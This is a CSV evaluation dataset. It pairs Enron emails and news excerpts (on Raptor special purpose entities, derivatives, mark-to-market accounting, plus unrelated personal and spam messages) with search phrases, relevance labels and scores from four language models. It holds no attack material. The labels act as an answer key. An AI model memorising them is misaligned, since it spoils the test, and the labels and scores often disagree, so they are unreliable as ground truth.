search_phrase,label,email,mistral_pred,openhermes_pred,vicuna_pred,gemma_pred
RANDOM,0,"Subject: ENE Options

Several of us are attempting to determine the number of options we will 
receive.  

The following is an excerpt from an E-speak discussion with Cindy Olson 
regarding the new Enron Option Plan effective Dec. 29, 2000.


The number of options will be based upon a Black-Scholes value. 

Black-Scholes is based upon a number of factors, including the stock price, 
the risk-free rate of return, the term of the stock options, 
and the general movement of Enron common stock as compared to the general 
stock market. 
The Black-Scholes value for Enron stock options is determined monthly. 

As of October 1, 2000, the Black-Scholes value for Enron stock options was 
$31, for seven-year options.

To estimate the number of options you might receive, divide 25 percent of 
your annual base salary by the Black-Scholes 
value for Enron stock.


Therefore we must find out the year end or Dec. Black-Scholes value for ENE.  
See if you can find it on the internet.",0.0,0.0,0.7,0.2
raptor creation of special purpose entities,0,"Subject: Re: New EOL ProductHow about 1:30 today on 32 in the Texas Gas Trading Area.Dale Neuner 06/23/2000 11:07 AMSubject: Re: New EOL Product We should sit and discuss the processes involved in creating new, unprecedented Product Types in EOL, as I think it is important for you to understand the myriad of processes involved. To start with, Legal will absolutely need to be involved, as it sounds like a new GTC is in order.Please call either Sheri Thomas or I when you are ready to discuss the new Product.Dale Enron Capital & Trade Resources Corp.Subject: Re: New EOL Product It is a totally new product.Dale Neuner 06/23/2000 09:43 AMThomas/HOU/ECT@ECT, Robert B Cass/HOU/ECT@ECTSubject: Re: New EOL Product Steve - One issue that immediately comes to mind is the 'General Terms and Conditions' ability to handle intra-day nominations. .This may require a new Product Type and GTC. Are we presently trading this product OTC, or is this unprecedented?DaleSubject: New EOL Product---------------------- Forwarded by Melba Lozano/HOU/ECT on 06/23/2000 09:30 AM --------------------------- Enron North America Corp.Subject: New EOL ProductWe are finalizing plans to introduce a new gas products(s) for July. The product(s) would be an hourly product either 5x8 or 5x12 or 5x16. Even though we have not decided which product to introduce, I thought I would give you a heads up to keep you in the loop.",0.0,0.0,0.3,0.0
RANDOM,0,"
huge game against San Francisco last weekend, posting 11 catches and 167 ya=
rds receiving. He'll face a questionable Indianapolis squad that is vulnera=
ble to the pass in Week 10, so starting Jackson this week is a solid option=
.   Stephen Davis , RB WAS - Bass/Hull Updated 11/16/01 Davis has stepped u=
p his play after beginning the season slowly. He's averaged 112 yards rushi=
ng over his last four games, and is once again emerging as a reliable Fanta=
sy player. Give him the start in Week 10 against a Denver defense that is v=
ulnerable to high scoring games.   Tony Banks , QB WAS - Free Agent Updated=
 11/16/01 Banks has played well of late, throwing five touchdowns in his la=
st three games. He's got a good matchup this weekend against a Denver team =
that can be beaten through the air, but he's only worth considering in very=
 deep Fantasy leagues.   Michael Westbrook , WR WAS - Free Agent Updated 11=
/16/01 Westbrook has been inconsistent this season, but he has caught three=
 touchdown passes in his last four games. He'll face a Denver secondary thi=
s weekend that is vulnerable at best, so starting him in deeper leagues is =
! wo! rth considering.   Rod Gardner , WR WAS - Free Agent Updated 11/16/01=
 Gardner has been held in check in his last two games, catching only three =
passes for 38 yards. He does have a favorable matchup this weekend against =
Denver, however, so starting him is a good move.   Az-Zahir Hakim , WR STL =
- Neal/McKay Updated 11/16/01 Hakim has been inconsistent in recent weeks, =
so starting him on your Fantasy team is a gamble unless the matchup is righ=
t. He'll go up against a tough New England secondary in Week Ten, so avoid =
using him outside of de! ep! er leagues.   Torry Holt , WR STL - Tori Updat=
ed 11/16/01 Holt continues to put up consistent yardage totals, but he's on=
ly scored only three touchdowns this season. He'll face a tough New England=
 secondary this weekend, but he's still worth starting on your Fantasy team=
 based on his potential to put up solid numbers.   Isaac Bruce , WR STL - F=
rank Updated 11/16/01 Bruce hasn't put up the huge Fantasy totals this seas=
on, but he's still one of the better wideouts in the league. He'll face CB =
Ty Law and the formidable New England secondary, but he's still wo! rt! h s=
tarting based on his potential for big numbers.   Marshall Faulk , RB STL -=
 Matty Updated 11/16/01 Faulk had a huge game against Carolina, proving tha=
t he is still the best Fantasy play",0.0,0.0,0.8,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"WASHINGTON -- As the significant role that derivatives played in Enron Corp=.'s downfall comes into focus, lawmakers and regulators are lining up in fa=vor of more oversight of these risky investments.=20While the Houston-based company's core energy operations involved natural-g=as and electricity transmission, its largest and most-profitable business w=as trading derivatives -- unregulated financial instruments that derive the=ir value from an underlying commodity or wager on the future. Now, informat=ion is surfacing that Enron's derivatives trading may have been used to mas=k weakness in the company's other businesses such as fiber-optic bandwidth,= retail gas and power, and water systems.""Enron was more of a hedge fund than an energy company,"" said Rep. Richard =Baker (R., La.), chairman of a Financial Services Committee panel that is l=ooking into the derivatives issue, in an interview.=20After listening to testimony at his committee's Enron hearing last week, Se=nate Governmental Affairs Chairman Joseph Lieberman said he would hold a he=aring specifically on the need for derivatives regulation. The Connecticut =Democrat was responding in part to the testimony of San Diego University la=w professor Frank Partnoy, who outlined a series of methods that he said En=ron used ""to create false profit and loss entries for the derivatives Enron= traded.""=20To ensure that Enron met Wall Street quarterly earnings estimates, it used =derivatives and off-balance-sheet partnerships, or so-called special-purpos=e vehicles, to hide losses on technology stocks and debts incurred to finan=ce unprofitable businesses, Mr. Partnoy said. In addition, he said, ""it app=ears that some Enron employees used dummy accounts and rigged valuation met=hodologies."" The entries, he said, ""were systematic and occurred over sever=al years, beginning as early as 1997.""=20Based on independent research and conversations with Enron traders, Mr. Par=tnoy said he learned that some traders apparently hid losses and understate=d profits, which had the effect of making derivatives trading appear less v=olatile than it was. Randall Dodd, director of the Derivatives Study Center=, an independent, nonpartisan Washington group, said in an interview that h=e has reached similar conclusions. Mr. Dodd is advising three government ag=encies and three congressional committees investigating Enron.=20Declining to address specific allegations, Enron spokesman Vance Meyer said= in a statement, ""Derivatives were not our business. They complemented our =core business of buying and selling natural gas and power."" Mr. Meyer also =said: ""I think it's safe to say that we are not going to agree with every v=iew about Enron presented in the congressional hearings, but we do respect =the process and hope, when all is said and done, that something positive wi=ll come out of it.""=20In 1989, the energy company, originally a utility that produced and transpo=",1.0,0.5,0.8,0.8
mark to market accounting practices,0,"Subject: RE: PG&E Action before Bankruptcy Court----- Forwarded by Richard B Sanders/HOU/ECT on 05/25/2001 09:15 AM -----Probably Bob Williams should attend.JimSubject:RE: PG&E Action before Bankruptcy CourtI have asked my asst, Twanda Sweet, to set up a meeting on Tues re this issue. I will include Mike Day. Is there anyone else that should be in this meeting---EES legal?----- Forwarded by Richard B Sanders/HOU/ECT on 05/25/2001 07:41 AM -----Michael Tribolet/ENRON@enronXgate 05/24/2001 10:08 AM  To: Robert Frank/NA/Enron@Enron, Richard B Sanders/HOU/ECT@ECT cc: Subject: RE: PG&E Action before Bankruptcy CourtPG&E want to fight the TURN accounting as it, basically, wiped out hopes of collecting their undercollected amount from a regulatory accounting perspective. The company has said they need to keep the old accounting convention alive, as it would bolster their chance for recovery in the litigation on the just and reasonable argument in Federal District Court. -----Original Message-----Subject:PG&E Action before Bankruptcy CourtCan either of you help me get Jim an answer?---------------------- Forwarded by Robert Frank/NA/Enron on 05/24/2001 09:49 AM --------------------------- James D Steffes05/24/2001 09:20 AMSubject:PG&E Action before Bankruptcy CourtBob --Monday, May 14 PG&E asked the Court to stay the PUC's March 27 Order on accounting procedures. Where is this going? This would be very bad.Jim<Embedded StdOleLink><Embedded Picture (Device Independent Bitmap)>",0.0,0.0,0.8,0.6
mark to market losses,0,"Subject: Trader, Monday S&P -3.10 CRB -1.31 NAS -17.98 USD +0.39 DOW -21.80M O N D A Y E X T R E M E M A R K E T SA complimentary service from INO.com ( http://www.ino.com/ )Monday: The CRB Index has retreated 1.31 points to 214.62. TheUS Dollar Index moved up 0.39 points to 115.32.The Dow Industrials declined 21.80 points, at 10935.17, whilethe S&P 500 slipped 3.10 points, last seen at 1263.51. TheNasdaq Composite moved down 17.98 points to 2173.55.FREE 20 PAGE GUIDE, THE ""Scientific Trader"" - learn to predict market!!!_____________________________________________________________________Legendary Trader Battles The Trend and Claims Victory_____________________________________________________________________Dear Trader:At last, a genuine market indicator that makes trading futures awhole lot easier and a ton more profitable . . .Now it can be yours! Over 30 years of trading experience ispacked into this remarkable new video from theINO.com Learning Center . . .THE NEXT STEP IN MARKET ANALYSISAn important new development occurred in the markets andlegendary trader Larry Williams wants you to know the secret.From the comfort of your own living room, you can be among thefirst to begin writing your own ticket to successful trading.Learn powerful methods to manage risk with a few common senselessons. In this video, Larry attacks the question; ""Doestechnical analysis really work?"" and teaches the unique art andinterpretation of commercial trading sentiment analysis. You'lllearn how to fade the guru and ""do the opposite"" of the masses tobuild your own successful trading system.Revolutionize your trading with the perfect market indicatorpresented in this exclusive video only available for INO.com.Endorsed by INO.com and proven in the markets!I urge you to click here to learn more about thisstartling discovery:Victory!</a>All claims on third-party products are made by the publisherand not by INO.com. All Products Guaranteed._____________________________________________________________________E X T R E M E M A R K E T C O M M E N T A R Y_____________________________________________________________________The STOCK INDEXES were lower on Monday in subdued trading as manyplayers remained on the sidelines ahead of this week's economic news.Overall losses were limited due to gains in chip stocks. Both indexesare at important crossroads as they are challenging April's highs.Multiple closes above these resistance levels are needed to extendthis spring's rallies. At the same time, momentum indicators areoverbought warning bulls to use caution as short-term tops might bein or near.The Dow closed lower on Monday but near mid-range. Light support camefrom drug and cyclical stocks. Gains in Caterpillar, Eastman Kodakand IBM also provided support for the Dow. Momentum indicators remainbullish signaling that a test of February's high crossing at11,035.10 is still possible this month.",0.0,0.0,0.8,0.2
raptor creation of special purpose entities,1,"Subject: FW: Raptor Debrisfyi, lets have a mtg.  -----Original Message-----Subject:FW: Raptor DebrisRick,Let me know if you would like to get together to discuss how the Raptor unwind is accomplished from a mechanical standpoint, as well as, what comes back to Enron in the transaction. I would happy to sit down and walk you through it. Just let me know when might work for you to get together. Thanks Rick,Ron Baker -----Original Message-----Subject:RE: Raptor DebrisI think that all investments that were hedged in Raptor are on th MPR and are being monitored and reported against. Is this true? Ron, will you take the lead in making sure we have a smooth transition on this? Thanks -----Original Message-----Subject:Raptor DebrisNow that Raptor is blown up, should we begin valuation efforts of assets and include in merchant portfolio. I am not familiar with details of how it unwound so I don't know what we are left with. Is this worth a meeting with you or your designesss? Rick",0.0,0.3,0.7,0.6
record keeping accounting practices,1,"iving investors an accurate picture of its finances and that it is followin=g consistent and generally accepted accounting rules and standards.=20Enron's downfall, caused in part by the accounting treatment of a series of= partnerships and ventures affiliated with the Houston energy trader, has t=hrown thousands of employees out of work and has cost the company's pension=ers and investors billions of dollars in stock value losses.=20Yet it would be a mistake to assume that all audited financial statements g=o through the same type of scrubbing and are comparable, said Ira Solomon, =who heads the accounting department at the University of Illinois.=20For example, two identical companies with the same level of sales and cost =structures could have different profit figures based upon the way they cons=truct their financial statements. The cost of inventory can be calculated b=y two methods that yield different results in the short term. Each approach= is an accepted practice, and each produces a different profit figure, Solo=mon said.=20J. Terry Strange, vice chairman, assurance and advisory services, for accou=nting firm KPMG, which audits Citigroup, said it makes sense that financial= services companies pay higher audit fees than other companies.=20""The size of the fee is directly related to the size, and more importantly,= the complexity of the enterprise being audited,"" Strange said. ""Financial =services companies are, generally speaking, the most complicated businesses=. The reason they are complicated is that they are in the financial risk bu=siness.=20""So risk enters into [calculating an audit fee]--the nature of risk that th=e enterprise takes and the amount of work that must be done to become comfo=rtable that the auditor understands and agrees with the accounting and beli=eves that the enterprise has controls in place to manage the risk they are =taking,"" he said.=20By those standards, it would make sense that Enron would be an expensive au=dit. The company in many ways operated as a financial services business, de=veloping new trading mechanisms and markets for everything from energy to t=elecommunications services--in the process inventing transactions that were= new to the business world.=20With that came high risks.=20""Clearly this was a very high-risk client. They were doing things in an ind=ustry that had never been done before,"" said Randolph Beatty, dean of USC's= Leventhal School of Accounting.=20But Andersen spokesman Tabolt said the company does not build a ""risk premi=um"" into its audit fees.=20Each of the five largest accounting firms conducts the audits of 2,000 to 3=,000 publicly traded companies in the United States, according to the Publi=c Accounting Report, an industry newsletter. They so dominate the business =that the No. 6 firm in the country, BDO Seidman, has only 325 SEC-reporting= clients.=20Although companies occasionally change auditors for such reasons as fees or=",0.0,0.1,0.8,0.2
RANDOM,0,"il (and any attachments
> hereto) are not intended to be an offer (or an acceptance) and do not
> create or evidence a binding and enforceable contract between Enron Corp.
> (or any of its affiliates) and the intended recipient or any other party,
> and may not be relied on by anyone as the basis of a contract by estoppel
> or otherwise. Thank you.
>
> **********************************************************************",0.0,0.0,0.7,0.0
RANDOM,0,"Subject: 


Assuming the two of you are still alive?  
Darnell",0.0,0.0,0.0,0.0
RANDOM,0,"Subject: Approval is Overdue: Access Request for carrie.larkworthy@enron.com

This request has been pending approval for  8 days and you are the alternate.  Please click http://itcapps.corp.enron.com/srrs/auth/emailLink.asp?ID=000000000078937&Page=Approval to review and act upon this request.







",0.0,0.0,0.5,0.0
record keeping accounting practices,0,"Drawing: Robber baron Jay Gould playing on Wall Street in 1882 (GRANGER COL=LECTION, JAY GOULD'S PRIVATE BOWLING ALLEY BY FREDERICK BURR OPPER)=20Copyright ? 2000 Dow Jones & Company, Inc. All Rights Reserved. =09Fact and Comment; Steve Forbes on Enron falloutSteve Forbes02/18/2002Forbes Magazine27Copyright 2002 Forbes Inc.ENRON=20In the aftermath, auditors of publicly held companies will become accountab=le only to the shareholders, not to a company's top management. That means =the auditors will be hired and fired by the board of directors' audit commi=ttee. It will be the audit committee telling management who's going to be l=ooking over the books rather than the other way around. The audit committee= will determine fees, and it will approve the actual payment of those fees.= Management won't be able to terminate the services of public accounting fi=rms; only the audit committee will have that power. Management will be able= to complain about the auditors, but that's all it'll be able to do. If the=re are major disputes between management and outside examiners, the audit c=ommittee will have to know about those conflicts.Other than taking care of routine regulatory filings with the Securities & =Exchange Commission (SEC) and perhaps preparing company tax returns, outsid=e auditors will be barred from providing services to publicly held companie=s whose books they are auditing.=20The SEC should be able to do most of the job of overseeing accountants and =accounting rules. If legislation is needed to reinforce the notion that acc=ountants are to work for the shareholders and the public, a now-cowed Congr=ess will quickly comply.=20But let's not kid ourselves. Some managements will still be tempted to cook= the books, though they'll have less cover and opportunity. Be that as it m=ay, there are still going to be speculative booms. After all, numerous now-=busted dot-coms never resorted to Enron-style sleights-of-hand to attract c=apital. They had no profits and often no sales, but investors still desired= those dot-com shares. These speculative bubbles are similar to one definit=ion of love--a willing suspension of disbelief.=20Copyright ? 2000 Dow Jones & Company, Inc. All Rights Reserved. =09OutFrontPremonitions; Why the Enron story may be a case of history repeating itself=.Lynn J. Cook and Dan Ackman02/18/2002Forbes Magazine40Copyright 2002 Forbes Inc.",0.0,0.0,0.0,0.0
RANDOM,0,"arview Technologies, a national computer wholesale remarketer.  Mike developed relationships with large computer  distribution houses (Ingram Micro, Techdata, Merisel, MicroAge)  which resulted in sales of $35 Million over  a three year period.  Prior to Starview Technologies, Mike was Manager  Corporate Accounts at Future Computing Solutions.  A $200 Million Enterprise Technology Solutions provider.  Mike developed  relationships with top line PC manufactures like  IBM, Toshiba, Compaq & Hewlett Packard, which resulted in revenue gains of  75 % in those products lines.  Mike was also  directly involved in multi million dollar technology roll out to clients like  Citicorp, Bristol Myers Squibb, Toshiba,  Prudential, KPMG.  Mike has a BBA in Business Marketing from Central State  University.
 - A Tavant Inc..doc 
 - A Tavant Inc Executive Summary2.doc ",0.0,0.0,0.8,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Derivatives at Root of Enron CollapseEnrons extensive use of derivatives, not just its accounting practices, lie= at the root of its fall into bankruptcy. Enron had used profits from its d=erivatives trading operation, which was little understood by investors, to =mask losses in its more visible businesses even as some of its employees ma=y have been fraudulently manipulating those profits. Enron reaped huge prof=its from derivatives. But it lost billions on most everything else it did,= including projects in fiber-optic bandwidth, retail natural gas and power,= water systems and technology stocks, but used its expertise in derivatives= to hide these losses. Derivatives are complex financial contracts whose va=lues are linked to underlying variables such as the prices of commodities, =stocks or bonds. They are used by sophisticated investors to manage risk. E=nron's use of derivatives both outside and inside the company can likely be= directly linked to its collapse. On the outside, they were used to create =the compan! y's web of off-balance sheet deals with complex financial partn=erships known as special-purpose vehicles. After some of those deals went s=our, Enron in October took a $1 billion charge against earnings and a $1.2 =billion write-down in shareholder equity, triggering its nosedive into bank=ruptcy. But Enron's derivatives problems ran far deeper than the outside sp=ecial purpose vehicles. It appears that some Enron employees used dummy acc=ounts and rigged valuation methodologies to create false profit and loss en=tries for the derivatives Enron traded.=20------------------------------------------------------------- Progas Storage and Services, Inc.Progas can custom build gas storage in the Upper Midwest.? Design to your specifications? Close to your markets? Unregulated storage? Lower transportation fees? Lower storage ratesProgas is now accepting proposals and orders for years 2002-2007 for approx=amately 5 bcf of storage on Midwestern system serving Indiana, Illinois, an=d 3 bcf on Texas Gas Transmission system serving Tennessee, northern Kentuc=ky, Indiana, and Ohio. Additional potential storage filds beding acquired =at this time on Midwestern, anhandle Eastern and A & R (Coastal) systems se=rving the Upper Midwest. Inquiries from potential partners, investment bank=ers, and brokers welcome.Progas Storage and Services, Inc.8610 South Highway 277Abilene, TX 79606-------------------------------------------------------------Williams Shares Plunge 22% on Telecom Debt",0.0,0.5,0.9,0.8
mark to market accounting practices,0,"Subject: Re: Global Accounting PromotionsThanks for much for your nice note. Where are you working now? I hate to say that I have lost track. --Sally Lynn Tippery02/21/2001 03:49 PMSubject: Global Accounting PromotionsCONGRATULATIONS! They did this right with you in the #1 spot! You definately earned it!Again, Congratulations.Lynn---------------------- Forwarded by Lynn Tippery/HOU/ECT on 02/21/2001 03:38 PM --------------------------- Enron North America Corp.Subject: Global Accounting PromotionsPlease join me and the Global Accounting leadership team in congratulating the following individuals on their promotions to:To Managing Director Sally Beck (EWN)  Fernley Dyson (EEL) To Vice President Beth Apollo (ENW)  Janine Juggins (EEL Tax) Phillip Lord (EBS)  Laura Scott (ENA) Chris Sherman (ENA) Wade Stubblefield (EES)To Senior Director Buddy Aiken (EEL) Jim Coffey (ENA) Donette Dewar (Intl. Tax) Patricia Dunn (NEPCO) Mark Frank (ENA) William Gehle (EECC) Joseph Grajewski (EECC) Jan Johnson (Corp) Scott Mills (ENW) James New (EEL) Mary L. Ruffer (ENA) Richard Sage (EEL)  Elaine Schield (Corp) Kevin Sweeney (ENW) Beth Wapner (EBS Tax)",0.0,0.0,0.5,0.0
raptor creation of special purpose entities,1,"Subject: Re: RaptorThat may work - I don't want to end up with an equity position I just worked hard to eliminate. Further, raptor may be a good accounting hedge but if we took back JEDI's share at existing marks we would be destroying significant real value. Will the buy back price of the equity/debt we get back from JEDI incorporate the write downs we think should occur?RegardsDelainey---------------------- Forwarded by David W Delainey/HOU/ECT on 05/11/2000  Enron Global FinanceSubject: Re: Raptor Dave, I assume you are asking how we hedge the portion of JEDI II investments that will come back to us after the restructuring. As any buyout price for CALPERS will reflect the state of the assets at closing, I think we are well hedged until the closing of the restructuring. We can see if we can reserve some Raptor capacity upfront to hege us moving forward from the restructuring closin. If this does not answer your question, let me know. MikeDavid W Delainey05/11/2000 01:37 PMSubject: Re: Raptor How do we immunize ourselves from the workouts being shed into Raptor?RegardsDelainey",0.3,0.4,0.0,0.6
record keeping accounting practices,0,"Subject: FW: EES Data Preservation----- Forwarded by Richard B Sanders/HOU/ECT on 06/11/2001 10:49 AM -----05/23/2001 07:02 PM FYIThanksGary> -----Original Message-----> (E-mail); Jean Frizzell (E-mail); Michael L. Kirby (E-mail); Michael> Molland; Mike D. Smith (E-mail); Peter Meringolo; Richard B. Sanders Esq.> (E-mail); Robert C. Williams (E-mail); Susan Bisop (E-mail)> Importance: High>> FYI> Thanks> Gary>> -----Original Message-----> Importance: High>> Rich,> Here is a summary of what we discussed with respect to EES.>> 1. EES will take its oldest backup tape as a snapshot of the email> system as it then existed. EES will not be making daily backups of the> email system. (This would involve about 7 tapes per day.) Thus, current> business email will not be kept for EES unless there is a business reason> to do so.>> 2. EES will take its oldest backup tape of data for its file servers as> a snapshop of the data that existed at that time. EES will not be making> any other backups of file server data other than they normally would in> the ordinary course of business>> 3. EES will not be taking copies or mirror images of the 300 employees> hard drives and any associated floppy disks at this time. Employees will> continue to use their equipment as they normally would.>> 4. If you need additional data preservation regarding EES other than as> described above, you will let me know.>> Please let me know if this summary is not accurate.> Thanks> Gary=======================================================This email message is for the sole use of the intended recipient(s) and may contain confidential and privileged information. Any unauthorized review, use, disclosure or distribution is prohibited. If you are not the intended recipient, please contact the sender by reply email and destroy all copies of the original message.To reply to our email administrator directly, send an email to BROBECK PHLEGER & HARRISON LLP",0.0,0.0,0.8,0.2
RANDOM,0,"Subject: 

As you know, the deadline for filing for the March primary for judicial=20
elections was January 4th. The following incumbent judges drew no opponents=

          Name                      Office                       Amount=20
budgeted

1. Pricilla Owen   Supreme Court   $10,000
  2. Mark Davidson  11th  District   $500
3. John Donovan   61st District   $1000
4. Harvey Brown   152 District   $1000
  5. Tim Taft   1st  Court of Appeals  $250
   6. John Anderson  14th Court of Appeals  $250
   7. Harvey Hudson  14th Court of Appeals  $250
  8. Richard Edelman  14th Court of Appeals  $250


I would be shocked if these candidates even had fund-raisers at this point.=
=20
Please let me know what you want to do about these uncontested raises.

I have requested $500 for Martha Hill Jamison.  My sources tell me that the=
=20
Republican activist groups (Steve Hotze) will be supporting Frank Gerald ov=
er=20
Martha Hill Jamison.  Perhaps we should hedge our bets on this race.  Let m=
e=20
know what you think.

There is another race that we have never talked about that I would like you=
=20
to consider.  Michael Stafford is the First Assistant to Michael Fleming, t=
he=20
County Attorney.  He is running for Johnny Holmes' office.  This may fall=
=20
under Joe Allen=01,s umbrella, but I think  there is a tremendous benefit t=
o=20
giving some money to Mike Stafford.  Steve Radack has informed me that he h=
as=20
the ""downtown establishment"" support.  If he wins, great.  If he loses, we=
=20
look good to Mike Fleming and to Mike Stafford.  I can personally attest th=
at=20
Stafford had tremendous influence of the County Attorneys=01, office.  This=
 may=20
come in handy at  a later date.  Again, I look to you for guidance.",0.0,0.0,0.9,0.2
raptor creation of special purpose entities,0,"Subject: Raptor 2 hedgeLet's redline (or accept) Ryan's changes and redistribute. Thanks. Sara----- Forwarded by Sara Shackleton/HOU/ECT on 10/19/2000 09:01 AM -----Ryan Siurek@ENRON10/19/2000 06:57 AM Sara,The version you distributed yesterday does not include the comments that I sent to Scott Sefton last week. Attached are my revisions. You can feel free to distribute to the broader group if you want. I will get comments from Rodney Faldyn and Bob Butts and then would like to distribute to LJM for their review and execution. Let me know if there are any outstanding comments and/or issues.Regards,Ryan----- Forwarded by Ryan Siurek/Corp/Enron on 10/19/2000 06:54 AM -----Kaye Ellis@ECT10/18/2000 12:05 PM Vasconcellos/Corp/Enron@ENRONI am resending this email for the benefit of those of you who did not receive it on October 5.----- Forwarded by Kaye Ellis/HOU/ECT on 10/18/2000 11:59 AM -----Sara Shackleton10/05/2000 02:24 PM Vasconcellos/Corp/Enron@ENRONAttached is the revised Raptor 2 hedge.",0.0,0.3,0.0,0.6
RANDOM,0,"Subject: 

Some guy at Duke told Mark Frevert today that on March 15th, Duke won a court ruling saying that they expanded the scope of the PanNat Arbitration.

True?",0.0,0.0,0.6,0.0
RANDOM,0,"Subject: Your enrollment status has been modified.





Dear MICHAEL,


Your enrollment status has been changed from 'Wait Listed' to 
'Removed from course' for the following course:


Course Title    : Understanding Options
Course Code     : UOPTNS-112701
Course Type     : Instructor Led Course


Starting Date   : Nov 27, 2001 8:00 AM
Ending Date     : Nov 28, 2001 5:00 PM


Thank you.",0.0,0.0,0.6,0.0
RANDOM,0,"Subject: RE: illin'

that sounds good on the flowers , mo is having her going away thing after work , so i will be home later after that ok

dq

 -----Original Message-----
Subject:	RE: illin'

thanks for calling the lawn guy
I ordered flowers from River Oaks Plant House - the ones with lemons in bottom to send to Amy and Baby Mackenzie.
I'm sure she'll love them.
kq


Subject:	RE: illin'

richard and carrie cancelled the b-day party due to the baby being sick
called about the lawn and left a msg , told him we would leave a check for $25 on the back patio

i slept just fine , hope you feel better

dq

 -----Original Message-----
Subject:	illin'

Hi hon- sorry to have tossed and turned last nite
i woke up with a cold! ugh
I won't think about it and hope it clears up
love you
kq
",0.0,0.0,0.8,0.2
RANDOM,0,"Subject: FW: WCS



 -----Original Message-----
Subject:	WCS

Jeff -

Thanks for contacting us regarding the Big Cats event on June 14, 2001.  I
personally can't attend the event, but in honor of your request and our
personal friendship, we are sending a contribution of $2500.

Keep up the good work.

Drayton McLane

DMc/dd",0.0,0.0,0.7,0.0
RANDOM,0,"ment measures. I 
just applied for post-baccalaureate status at U of O, so I can start taking 
economics and poli sci classes online. (I just got my new FREE computer from 
work!) I'm also studying for the GRE, and pretty soon here I'm going to get 
serious about graduate school. I think I've decided on international studies 
and/or economics, depending on how well I like the classes I take. I've found 
my dream program at Johns Hopkins University in Washington, D.C. It's a 
two-year Masters of International Studies program that begins in Washington 
and ends in.....are you sitting down?.....Bologna, Italy! Holy shit, does it 
get more perfect? Apparently it's like the premiere training ground for 
government officials, according to my friend Andy who laughed forcefully in 
my face when I told him I wanted to get into it. But I figure, I'm not 
getting any younger, and I don't want any regrets, so I'm goin' for it, dude. 
As for the love life, it's nonexistant, which is why I'm putting so much 
energy into the self-improvement area of my life. I figure as long as I'm 
having no fun with boys I might as well be beefing up my net value. By the 
time they come around again, the eligible pool will have shrunk to 1 in 100 
million. Whatever. Anyway, now that I've written you the longest paragraph of 
my life, I must retreat to my work duties. Then it's off for a thrilling tour 
of Portland via Tri-Met. Molly's making me dinner tonight in exchange for a 
finished resume. It's only taken her 3 years to compile the information for 
it, so this one should be a doozy. Hey, if you can ever make it home for a 
weekend, you should come at the end of May - David Gray is coming to the 
Schnitzer, and it's going to be fabulous! I'll buy your concert ticket if you 
can convince Dad to get your plane ticket. Call me soon if you can, or I'll 
call this weekend. Take care and I miss you!

Love,
Kate




Anna Symes <annas@cobs.edu> on 03/13/2001 02:55:09 PM

Subject: 


Hey Lady!

What do you think you're doing?  I haven't talked to you in way too long.
You have to update me on the sitch!  I am going on a date with a guy I met
while out with Monica last weekend.  He was our waiter and he looks like
Chandler Bing, only Monica kept calling him Chanandler Bong (did you see
that episode when they had to name who the TV Guide came to?).  She is so
fun!  I was so glad to get out of my apartment/away from my roommate.  And
now I have a date, so I'm excited.  I'm still in contact with",0.0,0.0,1.0,0.0
RANDOM,0,"Subject: Re: V28710.1-2 & V28732.1-2

Andrea,

These deals have been changed to NYMEX swaps.

Thanks,  

Errol, X5-8274


   
	
	
	


Subject: V28710.1-2 & V28732.1-2

Hi, 
 I received a call from BNP Paribas on these two EOL deals. 
The trader at BNP talked to Dutch about changing the deals from Gas Daily to 
Nymex
 please let me know 
 Thanks Angie",0.0,0.0,0.7,0.2
